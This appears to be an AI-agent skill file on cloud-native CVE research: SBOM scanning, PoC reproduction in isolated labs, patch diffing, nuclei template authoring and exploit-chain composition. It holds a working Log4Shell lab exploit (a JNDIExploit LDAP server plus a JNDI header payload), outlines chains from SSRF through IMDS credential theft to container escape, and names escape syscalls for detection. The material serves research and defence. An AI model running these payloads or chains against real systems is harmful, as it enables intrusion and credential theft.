---
name: cloud-native-vuln-research
description: CVE research methodology, PoC reproduction, patch gap analysis, and exploit chain composition across container/k8s/cloud-native surfaces; SBOM-driven vuln management and nuclei template authoring.
origin: github-trending-2026
version: "0.2.0.2"
compatibility: Claude Code, Claude Agent SDK
allowed-tools: Bash, Read, Edit, Write, Glob, Grep
metadata:
  domain: cloud-native
  category: cloud-native
  tool_count: 13
  guide_count: 1
  mitre: T1068-Exploitation for Privilege Escalation, T1210-Exploitation of Remote Services, T1190-Exploit Public-Facing App
  keywords: [cve, poc, nuclei, trivy, grype, sbom, log4shell, spring4shell, chaos-db, omigod, patch-gap, exploit-chain]
  last_reviewed: "2026-07-26"
---

# Skill: Cloud-Native Vulnerability Research

> **Supplementary Files**:
> - `payloads.md` — Command catalogue for nuclei, nuclei-templates contribution, trivy, grype, syft, osv-scanner, kube-bench, kube-hunter, peirates, plus PoC recipes for Log4Shell (CVE-2021-44228), Spring4Shell (CVE-2022-22965), Text4Shell (CVE-2022-42889), OMIGOD (CVE-2021-38645), Chaos DB (CVE-2021-42306), runc escape (CVE-2019-5736), CVE-2022-0185, CVE-2022-0847 Dirty Pipe, CVE-2018-1002105, plus KEV tracking and patch-gap analysis — 18 sections with real CVE references and nuclei YAML.
> - `test-cases.md` — Structured test cases (SBOM generation, vuln scanning with trivy/grype, nuclei template authoring, Log4Shell reproduction, OMIGOD reproduction, kernel container escape, k8s API server CVE reproduction, patch diff with bindiff, KEV catalog automation, exploit chain composition) — 12 cases across 6 categories.
> - `guides/cloud-native-vuln-research-playbook.md` — End-to-end research playbook: triage → lab build → PoC reproduction → patch diff → advisory. Includes the nuclei template ecosystem deep dive (projectdiscovery/nuclei-templates structure, PR workflow, April 2026 AI/LLM push), real-world case study walkthroughs (Log4Shell, Spring4Shell, Text4Shell, Chaos DB, OMIGOD, Codecov, Dirty Pipe, runc escape), and KEV-driven prioritization framework (CISA KEV, EPSS, CVSS v4.0).

## Summary

Cloud-native vulnerability research skill domain covering the full CVE lifecycle: triage of newly disclosed vulnerabilities against container/k8s/cloud surfaces, lab reproduction of PoCs, patch diff analysis to understand root cause and detect patches in the field, nuclei template authoring and contribution to projectdiscovery/nuclei-templates, SBOM-driven vulnerability management, and composition of exploit chains that link multiple CVEs into a single end-to-end compromise narrative. This is a methodology-and-research skill, not an assessment or defense skill — it operates forward-looking (new disclosures, patch gaps, KEV catalog) rather than backward-looking (audit existing infra).

**Tools**: nuclei, nuclei-templates, trivy, grype, syft, osv-scanner, kube-bench, kube-hunter, peirates, exploitdb, sploitus, vulners, gitlab-vulnerability-research

**Domain**: cloud-native

**MITRE ATT&CK**: T1068 (Exploitation for Privilege Escalation), T1210 (Exploitation of Remote Services), T1190 (Exploit Public-Facing Application)

## Description

Cloud-native environments — containers, Kubernetes, service mesh, managed cloud services — generate a continuous stream of CVEs that don't map onto traditional Linux or application vulnerability workflows. The patch gap between upstream disclosure and deployed remediation is measured in months; the exploit-public gap between PoC publication and mass exploitation is measured in days. This skill covers the research methodology that turns a newly-disclosed CVE into a reproducible finding, a detection signature, a nuclei template contribution, and (when applicable) a piece of a larger exploit chain.

Six problems distinguish cloud-native CVE research from generic CVE work:

1. **SBOM is the inventory** — you cannot patch what you cannot inventory. Container images are layered tarballs containing hundreds of OS packages and language-level dependencies. `syft` produces an SBOM (SPDX or CycloneDX); `trivy` and `grype` match that SBOM against NVD/OSV/GHSA; `osv-scanner` queries OSV.dev directly. Without SBOM, you're guessing.
2. **Container escape is a kernel problem wearing a container costume** — CVE-2022-0185 (heap overflow in `fs/context`), CVE-2022-0847 (Dirty Pipe), CVE-2021-22555 (netfilter), CVE-2023-2640/CVE-2023-32629 (OverlayFS) all break out of containers by exploiting the shared kernel. The "container" primitive is namespaces + cgroups; neither is a security boundary against a kernel LPE.
3. **k8s API server CVEs are cluster-tier immediately** — CVE-2018-1002105 (HTTP/2 privilege escalation, unauthenticated to cluster-admin), CVE-2019-11253 (YAML bomb DoS), CVE-2022-3162 (authn bypass), CVE-2023-2728 (node restriction bypass). One CVE on the control plane is game over; patch lag is intolerable.
4. **The cloud-managed services surface (OMIGOD, Chaos DB) is opaque** — customers cannot patch Azure OMI, Cosmos DB, or AWS services directly. The "patch" is waiting for the cloud provider. Detection shifts to virtual patching (WAF rules), network segmentation, and IMDS hardening.
5. **Exploit chains compose** — a real-world compromise is rarely one CVE. Log4Shell → SSRF → IMDSv1 → cloud role exfil. Spring4Shell → class loader manipulation → RCE → container escape via mounted docker.sock. The researcher's job is to understand both the individual CVE and how it composes with adjacent primitives.
6. **nuclei templates are the detection lingua franca** — projectdiscovery/nuclei-templates (12.6k stars, 3.5k forks as of April 2026) is the de-facto community library for "does this target have CVE-X". Authoring and contributing a template is the single highest-leverage research artifact: it lets every nuclei user detect the CVE, it's CI-tested, and it's a citable contribution in any advisory or write-up.

This skill covers how to triage a new CVE (severity, exploitability, cloud-native relevance), build a safe reproduction lab (Docker, kind, minikube, k3d, multi-arch via QEMU), reproduce the PoC, diff the patch (git log, gh advisory, bindiff), author a nuclei template, and (optionally) compose the CVE into an exploit chain that demonstrates real-world impact.

## Use Cases

- **PoC reproduction and verification**: Given a newly disclosed CVE (e.g. CVE-2026-21858), set up an isolated lab (Docker container, kind cluster), reproduce the published PoC, and produce a verified write-up that the CVE is exploitable on version X but patched in version Y.
- **Patch gap analysis**: For a fleet of container images or k8s clusters, identify which are still running a vulnerable version of a library/kernel/runtime, quantify the patch lag (days since fixed-version release), and prioritize remediation by KEV/EPSS scoring.
- **Exploit chain composition**: Take a single-CVE PoC (e.g. an LFI in a web app) and compose it with adjacent primitives (SSRF to IMDSv1, IMDS credentials to cloud role, cloud role to container escape via CVE-2022-0185) into an end-to-end compromise narrative for a red team report or executive briefing.
- **nuclei template authoring and contribution**: Author a YAML nuclei template that detects CVE-X remotely, validate it locally against a known-vulnerable and a known-patched target, then open a PR to `projectdiscovery/nuclei-templates` following the contribution guide and CI process.
- **SBOM-driven vulnerability management**: Generate an SBOM for every image in the registry (`syft`), match against NVD/OSV/GHSA (`trivy`/`grype`/`osv-scanner`), feed results to the vulnerability management program, and triage based on exploitability (reachable? network-exposed? KEV-listed?).
- **KEV (Known Exploited Vulnerabilities) tracking**: Subscribe to the CISA KEV catalog, score incoming additions by EPSS and cloud-native relevance, and produce a weekly "newly KEV-listed cloud-native CVEs" brief for the security team.
- **Supply chain CVE research**: When a dependency is disclosed as vulnerable (e.g. the Codecov bash uploader compromise), trace blast radius via SBOM queries, identify which images and services transitively include the affected component, and produce a remediation plan.

## Core Tools

### Detection & Template Authoring

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **nuclei** (projectdiscovery) | Template-based vulnerability scanner — runs YAML templates against targets | `nuclei -u https://target -t cves/2026/ -severity critical,high` |
| **nuclei-templates** (12.6k stars) | Community CVE/detection template library — 9000+ templates | `git clone https://github.com/projectdiscovery/nuclei-templates && nuclei -update-templates` |
| **gitlab-vulnerability-research** | GitLab's security research team tooling — advisory cross-referencing | `gh advisory view GHSA-xxxx-xxxx-xxxx` |

### SBOM & Vulnerability Scanning

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **syft** (Anchore, 6.3k stars) | SBOM generation from images, filesystems, archives — SPDX + CycloneDX | `syft myrepo/app:v1 -o spdx-json > sbom.spdx.json` |
| **trivy** (Aqua, 24k stars) | Image, IaC, K8s, FS scanner — NVD/OSV/GHSA matching | `trivy image --severity HIGH,CRITICAL myrepo/app:v1` |
| **grype** (Anchore, 8.5k stars) | Vulnerability scanner against SBOM or image | `grype sbom:sbom.spdx.json --fail-on high` |
| **osv-scanner** (Google) | OSV.dev-backed scanner for deps + lockfiles | `osv-scanner -r ./ --lockfile package-lock.json` |

### Cluster CVE & Reconnaissance

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **kube-bench** (Aqua, 7k stars) | CIS Kubernetes Benchmark automated checker | `kube-bench --benchmark cis-1.10 run` |
| **kube-hunter** (Aqua) | Active hunter — fingerprints and reports known cluster weaknesses | `kube-hunter --remote <api-server> --active` |
| **peirates** (InGuardians) | K8s pentest tool — used to verify post-CVE cluster takeover | `peirates` (interactive) |

### Exploit & Advisory Research

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **exploitdb** (OffSec) | Local exploit database — `searchsploit` CLI | `searchsploit log4shell` / `searchsploit -x 42930` |
| **sploitus** | Online exploit search engine — coverage across exploitdb, packetstorm, metasploit | `curl 'https://sploitus.com/?query=CVE-2026-21858'` |
| **vulners** (vulners.com) | Vulnerability database + audit API | `curl -s 'https://vulners.com/api/v3/search/lucene/?query=CVE-2021-44228'` |

## Methodology

### Five-Phase CVE Research Workflow

```
Phase 1            Phase 2            Phase 3            Phase 4            Phase 5
Triage & Scoring   → Lab Environment → PoC Reproduction → Patch Diff       → Exploit Chain
   │                  │                  │                  │                  │
   ▼                  ▼                  ▼                  ▼                  ▼
 NVD + KEV + EPSS,   Docker/kind/       Public PoC,        git log/diff,      Combine w/
 CVSS v3.1/v4.0,     minikube/k3d,      PoC github,        bindiff,           SSRF + IMDS,
 cloud-native        QEMU multi-arch,   commercial PoC,    GitHub Advisory,   container
 relevance filter,   snapshot/rollback  instrumented       advisory           escape, lateral
 SBOM reachability                      replay, capture                       movement,
                                                                              KEV report
```

**Phase 1: Triage & Scoring** — When a new CVE drops, the first question is: "does this matter to cloud-native surfaces?" Steps: pull NVD record (CVSS v3.1 base + vector), check CVSS v4.0 if available (supplements with exploitability metrics), check CISA KEV catalog (is it known-exploited?), check EPSS (probability of exploitation in next 30 days), check exploit availability (exploitdb, sploitus, vulners, github PoC search), check cloud-native relevance (container? k8s? service mesh? cloud-managed service?). Output: a triage card with severity, exploitability, relevance, and a go/no-go decision on whether to invest in PoC reproduction.

**Phase 2: Lab Environment Build** — Never reproduce PoCs against anything other than an isolated lab. For container CVEs: Docker with a snapshot-rollback workflow, or Podman rootless. For k8s CVEs: kind (k8s in Docker — fast spin-up, multi-node), minikube (single-node, mature drivers), k3d (k3s in Docker — lightweight, ARM64-friendly), or kubernetes-goat (intentionally vulnerable scenarios). For multi-arch CVEs: QEMU + binfmt_misc. Always snapshot the lab state before the PoC so rollback is one command.

**Phase 3: PoC Reproduction** — Pull the public PoC (github repo, exploitdb entry, blog write-up), adapt it to the lab, run it, capture evidence (logs, packet capture, memory dump if relevant). If the PoC fails, instrument and debug — many published PoCs target specific configurations or have undocumented prerequisites. If no public PoC exists, attempt to build one from the patch diff (Phase 4) — this is the highest-value research output.

**Phase 4: Patch Diff Analysis** — Pull the upstream fix (git log between vulnerable and patched version, `git diff v1.2.3 v1.2.4`), use `gh advisory view GHSA-xxxx-xxxx-xxxx` to read the advisory, and (for binary patches) use BinDiff or Diaphora to compare function-level changes. The patch diff answers: what's the root cause? what's the minimal detection signature? what other versions might be affected? Output: a root-cause analysis write-up and (where applicable) a Yara rule, Suricata signature, or nuclei template.

**Phase 5: Exploit Chain Composition** — Rarely is a single CVE the full story. Take the reproduced PoC and compose it with adjacent primitives: SSRF → IMDSv1 → cloud role exfil → kubelet on a worker node → kubelet RCE → pod on the node → container escape via CVE-2022-0185 → node root. The chain demonstrates real-world impact and informs the patch-priority and detection-strategy conversations with stakeholders.

### Quick Selection Guide

| Scenario | Primary Approach | Alternative |
|----------|------------------|-------------|
| New CVE in `log4j-core` | Reproduce CVE class in Docker lab, draft nuclei template | Cross-reference GHSA, check Log4Shell historical playbook |
| Container escape CVE (kernel) | Reproduce on QEMU VM with the vulnerable kernel, run PoC | Use kind with a vulnerable node image |
| k8s API server CVE | Stand up kind cluster at the vulnerable version, run PoC | Patch-diff upstream kubernetes/kubernetes PR |
| CVE in a cloud-managed service | Read the provider advisory, write detection (WAF/audit), document mitigations | Submit virtual-patching rule to WAF team |
| SBOM-driven vuln mgmt | `syft` → `grype sbom:` → triage by KEV/EPSS | `trivy image --format json` → custom triage script |
| KEV catalog automation | Daily pull of CISA KEV JSON, filter by cloud-native keywords | Subscribe to KEV RSS, alert in Slack |
| nuclei template authoring | Write template, `nuclei -ut`, validate against vuln+patched targets, PR | Use `nuclei-template-validator` action in CI |
| Exploit chain composition | Document each CVE step, identify adjacent primitives, write end-to-end walkthrough | Use a flow diagram (Mermaid) for stakeholder report |

### Defense Perspective

| Defense Measure | Description |
|-----------------|-------------|
| **SBOM everywhere** | Generate SBOM at build time for every image; store alongside image in registry; query SBOM at vuln-disclosure time, not at scan time. |
| **KEV-driven prioritization** | Patch KEV-listed CVEs within the CISA-due-date (typically 14-21 days); track KEV RSS; alert on cloud-native additions. |
| **Virtual patching** | WAF rule or network policy that blocks the exploit vector before the patch is rolled out — critical for cloud-managed services you can't directly patch. |
| **Runtime detection (Falco)** | Falco rules for: container escape syscalls (`nsenter`, `mount`, `unshare`), unexpected outbound from containers, writes to `/proc/sys/kernel`, kernel exploit symptoms. |
| **Network segmentation** | Default-deny egress from pods; block IMDS (169.254.169.254) from all pods except those that explicitly need it; isolate control plane (etcd, kubelet). |
| **Image signing + admission** | cosign-signed images only; Kyverno or OPA Gatekeeper policy that rejects unsigned images and enforces digest pinning. |
| **Patch lag monitoring** | Dashboard showing days-since-patched-version-release for each image; alert when lag exceeds policy threshold (e.g. 30 days for criticals, 7 days for KEV). |
| **Admission-time CVE scan** | Trivy or Grype admission webhook that rejects images with unpatched critical CVEs at deploy time. |

## Practical Steps

> **Detailed payloads in `payloads.md`, complete test checklist in `test-cases.md`.**

### Exercise 1: SBOM-Driven Vulnerability Triage

Goal: take a container image, produce an SBOM, match against known vulns, triage by exploitability.

```bash
# 1. Generate SBOM (SPDX JSON) from the image
syft myrepo/app:v1 -o spdx-json > sbom.spdx.json

# 2. Match SBOM against known vulns
grype sbom:sbom.spdx.json --only-fixed --severity high,critical -o json > grype.json

# 3. Cross-check with OSV (independent feed)
osv-scanner --sbom=sbom.spdx.json --format=json > osv.json

# 4. For each HIGH/CRITICAL finding, check KEV and EPSS
jq '.matches[] | {vuln: .vulnerability.id, pkg: .artifact.name, version: .artifact.version}' grype.json
# For each vuln id, query CISA KEV: curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json | jq '.vulnerabilities[] | select(.cveID=="CVE-XXXX-XXXXX")'

# 5. Triage matrix: KEV-listed & network-exposed = patch now; KEV-listed & not-exposed = patch within 7d; not-KEV & EPSS>0.5 = patch within 30d; else scheduled.
```

### Exercise 2: Log4Shell Reproduction in a Container Lab

Goal: reproduce CVE-2021-44228 in an isolated Docker lab and confirm exploitation.

```bash
# 1. Spin up a vulnerable log4j app (the pojavzn/VulnLab log4shell image or similar)
docker run -d --name log4shell-lab -p 8080:8080 ghcr.io/pojavzn/vulnlab-log4shell:2.14.0

# 2. Verify the endpoint
curl -s http://localhost:8080/ | head

# 3. Stand up a malicious LDAP server (JNDIExploit or marshalsec)
git clone https://github.com/feihong-cs/JNDIExploit
cd JNDIExploit && java -jar JNDIExploit.jar -i 127.0.0.1 -p 1389 &

# 4. Send the payload (header vector)
curl -sv -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}' http://localhost:8080/

# 5. Confirm execution
docker exec log4shell-lab ls /tmp/pwned
```

### Exercise 3: nuclei Template Authoring + Local Validation

Goal: write a nuclei template for a new CVE, validate against vuln+patched, prep a PR.

```bash
# 1. Author the template (see payloads.md §6 for full schema)
mkdir -p my-templates && cat > my-templates/CVE-2026-21858.yaml <<'EOF'
id: CVE-2026-21858

info:
  name: Acme Web UI - Auth Bypass
  author: brucesong
  severity: critical
  description: |
    Acme Web UI before 3.4.2 permits authentication bypass via crafted Authorization header.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2026-21858
    - https://github.com/acme/web-ui/security/advisories/GHSA-xxxx-xxxx-xxxx
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2026-21858
    cwe-id: CWE-287
  metadata:
    verified: true
    shodan-query: "http.title:\"Acme Web UI\""
  tags: cve,cve2026,acme,auth-bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin/console"
    headers:
      Authorization: "Bypassed"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Admin Console"
          - "Version 3.4"
        condition: and
      - type: status
        status:
          - 200
EOF

# 2. Lint the template locally
nuclei -t my-templates/CVE-2026-21858.yaml -u https://vuln-target.local -validate
nuclei -t my-templates/CVE-2026-21858.yaml -u https://patched-target.local
# Expect: 1 finding on vuln-target, 0 on patched-target.

# 3. Fork + clone nuclei-templates, place the file under cves/2026/
git clone https://github.com/<your-gh-user>/nuclei-templates
mkdir -p nuclei-templates/cves/2026
cp my-templates/CVE-2026-21858.yaml nuclei-templates/cves/2026/

# 4. Run the CI checks locally (markdownlint + yaml-lint + nuclei -validate)
cd nuclei-templates && nuclei -validate -t cves/2026/CVE-2026-21858.yaml

# 5. Open a PR
git checkout -b add-CVE-2026-21858
git add cves/2026/CVE-2026-21858.yaml && git commit -m "add CVE-2026-21858 Acme Web UI auth bypass"
git push -u origin add-CVE-2026-21858
gh pr create --title "Add CVE-2026-21858 (Acme Web UI Auth Bypass)" --body "Validated against vuln+patched targets."
```

### Exercise 4: Patch Diff with `git log` + `gh advisory`

Goal: understand the root cause of a CVE from its patch.

```bash
# 1. Pull the advisory
gh api repos/acme/web-ui/security-advisories | jq '.[] | select(.cve_id=="CVE-2026-21858")'

# Or read the GHSA directly
gh advisory view GHSA-xxxx-xxxx-xxxx

# 2. Pull the upstream repo at the patched version
git clone https://github.com/acme/web-ui
cd web-ui && git log --oneline v3.4.1..v3.4.2 -- src/auth/

# 3. Diff the auth module
git diff v3.4.1..v3.4.2 -- src/auth/middleware.go

# 4. For a binary-only patch, use BinDiff
# (Requires IDA Pro or Ghidra export; see guides/cloud-native-vuln-research-playbook.md §Patch Diff)

# 5. Distill a detection signature from the diff
# (e.g. "if the response to GET /admin/console without Authorization contains 'Admin Console', it's vulnerable")
```

### Defense Perspective

The research skill's defense counterpart is SBOM-driven vulnerability management, KEV-driven prioritization, virtual patching (WAF, network policy), and runtime detection. The researcher who understands how defenders consume their output writes better advisories, better nuclei templates, and better PoC write-ups.

- **For SBOM teams**: every published CVE should be matched against your SBOM within 24h of disclosure; the SBOM is the single source of truth for "are we affected".
- **For patch teams**: KEV catalog additions should drive expedited patching (CISA due-dates); EPSS > 0.5 with network exposure should drive 30-day patch SLAs.
- **For detection teams**: every CVE PoC should produce a Falco rule (runtime), a Suricata signature (network), or a nuclei template (active validation) — ideally all three.
- **For incident response**: the patch diff from Phase 4 is the foundation of post-incident forensics — knowing the root cause tells you what artifacts to hunt for.

## Differentiation

| Skill | Focus | Overlap with `cloud-native-vuln-research` |
|-------|-------|-------------------------------------------|
| `cloud-native-vuln-research` (this) | **CVE research methodology, PoC reproduction, patch diff, nuclei templates, exploit chain composition** — forward-looking, methodology-centric | — |
| `cloud-security` | Cloud infra assessment (AWS/Azure/GCP IAM, S3, IMDS, storage, networking) | Shares cloud-provider CVEs (OMIGOD, Chaos DB); this skill researches the CVE, cloud-security assesses exposure. |
| `container-security` | Container defense and best practices — image hardening, runtime protection, escape mechanics from a defender angle | Shares container escape CVEs (runc, CVE-2022-0185); this skill reproduces and writes detection, container-security defends. |
| `kubernetes-attack` | Offensive operations against a live k8s cluster — RBAC abuse, pod escape, SA token theft, etcd exploitation | Shares k8s CVEs (CVE-2018-1002105, CVE-2022-3162); this skill reproduces the CVE and authors templates, kubernetes-attack chains live compromises. |
| `binary-reverse` | Binary reverse engineering — disassembly, decompilation, binary diffing | This skill uses BinDiff/Diaphora from binary-reverse as a tool in Phase 4; binary-reverse is the source skill. |
| `exploit-development` | Exploit development for memory corruption, ROP, heap exploitation | This skill consumes published PoCs and composes chains; exploit-development produces the underlying primitives. |
| `supply-chain-security` | Supply chain integrity — dependency provenance, SBOM verification, CI/CD hardening | Shares Codecov-style supply chain CVEs; this skill researches the CVE, supply-chain-security defends the pipeline. |

**This skill is research/methodology**, not assessment (use cloud-security/container-security for that), not offense (use kubernetes-attack), not defense (use container-security). It produces CVE write-ups, PoCs, nuclei templates, and exploit chain narratives.

## Detection Methods

### Vulnerability Research Detection
- **CVE database monitoring**: NVD, MITRE ATT&CK; weekly review of new cloud-native CVEs.
- **GitHub Security Advisories**: Subscribe to dependent package advisories.
- **Vendor disclosures**: AWS Security Bulletins, Azure Updates, GCP Release Notes.
- **Cloud security blogs**: Aqua, Sysdig, Wiz, Palo Alto Prisma; weekly vulnerability write-ups.

### Runtime Vulnerability Detection
- **Container image scanning**: Trivy, Grype, Snyk Container; CI/CD integration.
- **Runtime workload scanning**: Falco, Tetragon; eBPF-based runtime detection.
- **CSPM (Cloud Security Posture Management)**: Prowler, ScoutSuite; continuous configuration audit.
- **CWPP (Cloud Workload Protection Platform)**: Aqua, Sysdig Secure; runtime protection.

### Common Vulnerable Component Categories
- **Container escape CVEs**: CVE-2022-0185 (heap overflow), CVE-2024-1086 (netfilter), runc CVE-2024-21626.
- **Kubernetes API server CVEs**: CVE-2023-2728 (anonymous auth bypass), CVE-2024-5321 (etcd compromise).
- **Service mesh CVEs**: Istio CVE-2023-44387, Envoy CVE-2024-32975.
- **Cloud provider CVEs**: AWS IMDSv1 weaknesses, Azure AD connectivity issues.

### SIEM Detection Rules
- **Trivy scan action**: GitHub Actions integration; block PRs with CRITICAL CVEs.
- **Falco rules**: Runtime detection of container escape attempts.
- **Splunk SPL**: `index=vuln scanner=trivy | stats count by vuln_id | sort -count`

## Defense Evasion Techniques

### Vulnerability Research Stealth
- **Use bug bounty disclosures**: Research publicly disclosed CVEs; test on your own infrastructure only.
- **Responsible disclosure**: Coordinate with vendor before public disclosure.
- **Avoid active exploitation in prod**: Test only in lab/CTF environments.

### Exploit Stealth (when authorized)
- **Target patched components**: Test that patch actually mitigates; report gap to vendor.
- **Avoid destructive payloads**: Use read-only PoCs; don't modify customer data.
- **Off-hours testing**: Schedule scans during maintenance windows; minimize impact.

### Reporting Stealth
- **Coordinated disclosure timeline**: 90 days standard; respect vendor's release cadence.
- **CVE assignment**: Request CVE from MITRE or CNA; official record of research.
- **Bug bounty platforms**: HackerOne, Bugcrowd; structured reporting and rewards.

### Defensive Counter-Perspective
- **Verify remediation effectiveness**: Don't just disclose; help vendor validate fix.
- **Detection rule contribution**: Submit YARA / Sigma rules for community defense.
- **Educational content**: Conference talks (DEF CON, Black Hat) raise awareness without weaponization.

## References

- ProjectDiscovery April 2026 nuclei templates release: <https://github.com/projectdiscovery/nuclei-templates/releases/tag/v10.0.0>
- CISA Known Exploited Vulnerabilities Catalog: <https://www.cisa.gov/known-exploited-vulnerabilities-catalog>
- NIST National Vulnerability Database: <https://nvd.nist.gov/>
- GitHub Security Advisory Database: <https://github.com/advisories>
- OSV.dev: <https://osv.dev/>
- CNCF Security TAG: <https://github.com/cncf/tag-security>
- Anchore Syft: <https://github.com/anchore/syft>
- Aqua Trivy: <https://github.com/aquasecurity/trivy>
- ProjectDiscovery Nuclei: <https://github.com/projectdiscovery/nuclei>
